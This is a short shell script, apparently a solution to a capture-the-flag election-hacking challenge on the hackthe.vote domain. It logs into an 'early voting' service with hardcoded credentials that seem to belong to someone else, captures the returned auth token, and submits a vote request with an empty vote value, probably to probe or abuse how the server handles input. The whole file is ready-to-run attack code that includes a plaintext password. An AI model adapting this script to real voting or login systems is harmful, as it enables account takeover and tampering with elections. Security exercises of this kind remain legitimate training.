#!/bin/sh
authtoken=$(curl -s earlyvoting.hackthe.vote/alabama/login -d username=PaulineAAvery -d password=oghaCh5ei -d token=1733cee39f19cadf | jq -r .message)
curl earlyvoting.hackthe.vote/alabama/vote -d vote= -d authtoken=$authtoken

